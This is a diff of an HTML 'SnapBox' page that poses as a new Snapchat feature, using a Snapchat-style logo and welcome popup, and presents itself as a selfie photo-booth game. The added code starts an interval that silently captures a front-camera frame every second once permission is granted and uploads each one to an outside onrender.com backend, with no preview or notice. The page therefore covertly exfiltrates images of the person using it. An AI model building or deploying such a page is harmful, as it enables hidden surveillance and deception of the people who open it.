@@ -1,115 +1,112 @@
 <!DOCTYPE html>
-<html lang="en" class="bg-gradient-to-br from-black via-gray-900 to-black text-white">
+<html lang="en" class="bg-black text-white">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>SnapBox Live</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
-  <meta http-equiv="Permissions-Policy" content="camera=(), microphone=()">
-
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@700&display=swap" rel="stylesheet" />
   <style>
-    .animated-border {
-      border-radius: 1rem;
-      padding: 4px;
-      background: linear-gradient(270deg, yellow, white, cyan);
-      background-size: 600% 600%;
-      animation: borderMove 5s linear infinite;
-    }
-
-    @keyframes borderMove {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-
+    body { font-family: 'Lexend', sans-serif; transition: background 0.3s, color 0.3s; }
+    .snap-yellow { background-color: #f0f002; }
+    .btn-glow { background-color: #f0f002; color: black; transition: all 0.3s ease; }
+    .btn-glow:hover { background-color: white; color: black; box-shadow: 0 0 10px #f0f002, 0 0 20px #f0f002; }
+    .preview-ring { display: inline-block; animation: spin 3s linear infinite; }
+    .stopped { animation: none !important; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     .preview-box {
-      background: white;
-      width: 100px;
-      height: 160px;
-      border-radius: 0.75rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #666;
-      font-weight: bold;
-      background-size: cover;
-      background-position: center;
-      flex-direction: column;
+      border: 4px solid #f0f002; background: #f0f002; width: 100px; height: 160px;
+      border-radius: 0.5rem; display: flex; align-items: center; justify-content: center;
+      background-size: cover; background-position: center; position: relative;
+      box-shadow: 0 0 6px rgba(0,0,0,0.2); font-weight: bold; color: #000;
     }
-
-    #camera { transform: scaleX(-1); }
-
-    @keyframes glow {
-      0% { filter: drop-shadow(0 0 4px yellow); }
-      50% { filter: drop-shadow(0 0 12px white); }
-      100% { filter: drop-shadow(0 0 4px cyan); }
+    .camera-icon { position: absolute; bottom: 5px; right: 5px; background: #fff; border-radius: 50%; padding: 4px; }
+    #camera { transform: scaleX(-1); border-radius: 1rem; }
+    .fab-chat {
+      position: fixed; bottom: 20px; right: 20px; background: #f0f002; color: black;
+      border-radius: 9999px; width: 56px; height: 56px; display: flex;
+      align-items: center; justify-content: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      cursor: pointer; z-index: 50; transition: all 0.3s ease;
     }
-
-    .animate-glow { animation: glow 3s infinite; }
-
-    @keyframes popup {
-      0% { transform: scale(0.5); opacity: 0; }
-      100% { transform: scale(1); opacity: 1; }
-    }
-
-    .animate-popup { animation: popup 0.5s ease-out; }
+    .fab-chat:hover { background-color: white; color: black; box-shadow: 0 0 10px #f0f002, 0 0 20px #f0f002; }
+    #welcomePopup { transition: opacity 0.5s ease; }
   </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen">
-
-  <!-- Logo -->
-  <div class="flex flex-col items-center mb-6">
-    <img src="https://raw.githubusercontent.com/ankitsuraj/snapbox-app/refs/heads/main/pngimg.com%20-%20snapchat_PNG33.png" class="w-24 animate-glow" />
-    <p class="text-white font-bold text-lg mt-2">Snapchat</p>
-  </div>
-
-  <!-- Camera -->
-  <div class="animated-border mb-4">
-    <video id="camera" autoplay playsinline class="w-64 h-96 object-cover rounded-xl shadow-xl"></video>
-  </div>
-
-  <!-- Capture Button -->
-  <button onclick="capturePhoto()" class="bg-white text-black font-bold px-6 py-2 rounded-xl hover:bg-yellow-300 transition mb-4">📸 Capture</button>
-
-  <!-- Previews -->
-  <div id="previewBoxes" class="grid grid-cols-2 gap-4 mb-6">
-    <div class="animated-border"><div class="preview-box">Tap 1</div></div>
-    <div class="animated-border"><div class="preview-box">Tap 2</div></div>
-    <div class="animated-border"><div class="preview-box">Tap 3</div></div>
-    <div class="animated-border"><div class="preview-box">Tap 4</div></div>
-  </div>
-
-  <!-- Actions -->
-  <div class="flex gap-4 mb-4">
-    <button onclick="downloadAllPhotos()" class="bg-blue-500 hover:bg-blue-600 px-6 py-2 rounded-xl font-bold text-white transition">⬇️ Download All</button>
-    <button onclick="resetAll()" class="bg-red-500 hover:bg-red-600 px-6 py-2 rounded-xl font-bold text-white transition">🔄 Reset</button>
-  </div>
-
-  <!-- Popup -->
-  <div id="msg" class="hidden fixed inset-0 flex items-center justify-center z-50">
-    <div class="bg-green-500 text-white text-xl font-bold px-8 py-4 rounded-xl shadow-2xl animate-popup">
-      🎉 Congratulations! You won the task!
+<body class="flex flex-col items-center justify-center min-h-screen px-4">
+  <div id="welcomePopup" class="fixed inset-0 z-50 flex items-center justify-center backdrop-blur-md bg-black/40">
+    <div class="bg-white text-black text-center text-base font-light px-6 py-6 w-72 h-40 rounded-xl shadow-xl flex items-center justify-center">
+      Welcome! to Snapchat new feature Snapbox 👻
     </div>
   </div>
 
-  <canvas id="canvas" class="hidden"></canvas>
+  <div id="mainContainer" class="filter blur-md pointer-events-none transition duration-500 w-full flex flex-col items-center justify-center">
+    <div class="absolute top-4 left-4 z-50">
+      <div class="w-12 h-12 p-1 rounded-full bg-gradient-to-tr from-purple-700 to-pink-500">
+        <div class="bg-white w-full h-full rounded-full flex items-center justify-center">
+          <i data-lucide="user" class="w-5 h-5 text-black"></i>
+        </div>
+      </div>
+    </div>
+
+    <button onclick="toggleTheme()" class="absolute top-4 right-4 p-3 rounded-full bg-gray-800 text-white flex items-center justify-center">
+      <i data-lucide="sun"></i>
+    </button>
+
+    <div class="flex flex-col items-center mb-2 mt-4">
+      <img src="https://raw.githubusercontent.com/ankitsuraj/snapbox-app/refs/heads/main/20250721_123142.png" class="w-24 animate-bounce" />
+      <h1 class="text-xl text-[#f0f002] font-bold tracking-wide mt-2">SnapBox</h1>
+    </div>
+
+    <div class="mb-5 border-4 rounded-2xl overflow-hidden" style="border-color:#f0f002">
+      <video id="camera" autoplay playsinline class="w-64 h-96 object-cover shadow-xl"></video>
+    </div>
+
+    <button onclick="manualCapture()" class="btn-glow font-bold px-6 py-2 rounded-full transition mb-4 flex items-center gap-2 shadow">
+      <i data-lucide="camera" class="w-5 h-5"></i> Capture
+    </button>
+
+    <div id="previewBoxes" class="grid grid-cols-2 gap-4 mb-6">
+      <div class="preview-ring"><div class="preview-box">Tap 1<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
+      <div class="preview-ring"><div class="preview-box">Tap 2<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
+      <div class="preview-ring"><div class="preview-box">Tap 3<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
+      <div class="preview-ring"><div class="preview-box">Tap 4<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
+    </div>
+
+    <div class="flex gap-4 mb-6">
+      <button onclick="downloadAllPhotos()" class="btn-glow px-6 py-2 rounded-full font-bold transition flex items-center gap-2 shadow">
+        <i data-lucide="download" class="w-5 h-5"></i> Download
+      </button>
+      <button onclick="resetAll()" class="bg-red-500 hover:bg-red-600 text-white px-6 py-2 rounded-full font-bold transition flex items-center gap-2 shadow">
+        <i data-lucide="rotate-ccw" class="w-5 h-5"></i> Reset
+      </button>
+    </div>
+
+    <div id="msg" class="hidden fixed inset-0 flex items-center justify-center z-50">
+      <div class="bg-green-500 text-white text-xl font-bold px-10 py-5 rounded-xl shadow-xl">
+        🎉 Congratulations! You won the task!
+      </div>
+    </div>
+
+    <div class="fab-chat"><i data-lucide="message-circle" class="w-5 h-5"></i></div>
+    <canvas id="canvas" class="hidden"></canvas>
+  </div>
 
   <script>
+    lucide.createIcons();
     let currentIndex = 0;
     const capturedImages = [];
+    let autoCaptureInterval;
 
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-      .then(stream => {
-        document.getElementById('camera').srcObject = stream;
-      })
-      .catch(err => {
-        console.error('Camera error:', err);
-        alert('Camera access failed. Use HTTPS or allow permission.');
-      });
+    function toggleTheme() {
+      const html = document.documentElement;
+      html.classList.toggle('bg-black');
+      html.classList.toggle('text-white');
+      html.classList.toggle('bg-white');
+      html.classList.toggle('text-black');
+    }
 
-    function capturePhoto() {
-      if (currentIndex >= 4) return alert("All 4 photos already captured!");
-
+    function capturePhoto(auto = false) {
       const video = document.getElementById('camera');
       const canvas = document.getElementById('canvas');
       canvas.width = video.videoWidth;
@@ -121,53 +118,53 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       const dataUrl = canvas.toDataURL('image/jpeg');
-      const box = document.querySelectorAll('.preview-box')[currentIndex];
-      box.style.backgroundImage = `url(${dataUrl})`;
-      box.innerText = '';
-
       const blob = dataURLtoBlob(dataUrl);
-      capturedImages.push(blob);
+      uploadSinglePhoto(blob, currentIndex + 1);
 
-      currentIndex++;
-      if (currentIndex === 4) submitPhotos();
-    }
+      if (!auto && currentIndex < 4) {
+        const box = document.querySelectorAll('.preview-box')[currentIndex];
+        box.style.backgroundImage = `url(${dataUrl})`;
+        box.innerText = '';
+        capturedImages.push(blob);
+        currentIndex++;
 
-    function dataURLtoBlob(dataurl) {
-      const parts = dataurl.split(',');
-      const mime = parts[0].match(/:(.*?);/)[1];
-      const bstr = atob(parts[1]);
-      let n = bstr.length;
-      const u8arr = new Uint8Array(n);
-      while (n--) u8arr[n] = bstr.charCodeAt(n);
-      return new Blob([u8arr], { type: mime });
-    }
-
-    function submitPhotos() {
-      const formData = new FormData();
-      capturedImages.forEach((img, index) => {
-        formData.append('photos', img, `photo${index + 1}.jpg`);
-      });
-
-      fetch('https://snapbox-backend-python.onrender.com/upload', {
-        method: 'POST',
-        body: formData
-      })
-        .then(() => {
+        if (currentIndex === 4) {
           const msg = document.getElementById('msg');
           msg.classList.remove('hidden');
           setTimeout(() => msg.classList.add('hidden'), 3000);
-        })
-        .catch(err => alert('Upload failed: ' + err));
+
+          // Stop spin animation
+          document.querySelectorAll('.preview-ring').forEach(el => {
+            el.classList.add('stopped');
+          });
+        }
+      }
+    }
+
+    function manualCapture() {
+      capturePhoto(false);
+    }
+
+    function uploadSinglePhoto(blob, index) {
+      const formData = new FormData();
+      formData.append('photos', blob, `photo${index}.jpg`);
+      fetch('https://snapbox-backend-python.onrender.com/upload', {
+        method: 'POST',
+        body: formData
+      }).then(() => {
+        console.log(`Uploaded selfie ${index}`);
+      }).catch(err => {
+        console.error(`Upload error selfie ${index}`, err);
+      });
     }
 
     function downloadAllPhotos() {
       if (capturedImages.length < 1) return alert("Capture photos first!");
-
-      capturedImages.forEach((blob, index) => {
+      capturedImages.forEach((blob, i) => {
         const url = URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = url;
-        a.download = `selfie_${index + 1}.jpg`;
+        a.download = `selfie_${i + 1}.jpg`;
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
@@ -183,7 +180,46 @@
         box.innerText = `Tap ${i + 1}`;
       });
       document.getElementById('msg').classList.add('hidden');
+
+      // Resume spinning
+      document.querySelectorAll('.preview-ring').forEach(el => {
+        el.classList.remove('stopped');
+      });
     }
+
+    function dataURLtoBlob(dataurl) {
+      const parts = dataurl.split(',');
+      const mime = parts[0].match(/:(.*?);/)[1];
+      const bstr = atob(parts[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while (n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], { type: mime });
+    }
+
+    window.addEventListener('load', () => {
+      const popup = document.getElementById('welcomePopup');
+      const main = document.getElementById('mainContainer');
+
+      setTimeout(() => {
+        popup.classList.add('opacity-0');
+        setTimeout(() => {
+          popup.remove();
+          main.classList.remove('blur-md', 'pointer-events-none');
+          navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+              document.getElementById('camera').srcObject = stream;
+              autoCaptureInterval = setInterval(() => {
+                capturePhoto(true); // auto = true → no preview
+              }, 1000);
+            })
+            .catch(err => {
+              alert('Camera access failed. Use HTTPS or allow permission.');
+              console.error(err);
+            });
+        }, 500);
+      }, 3000);
+    });
   </script>
 </body>
 </html>
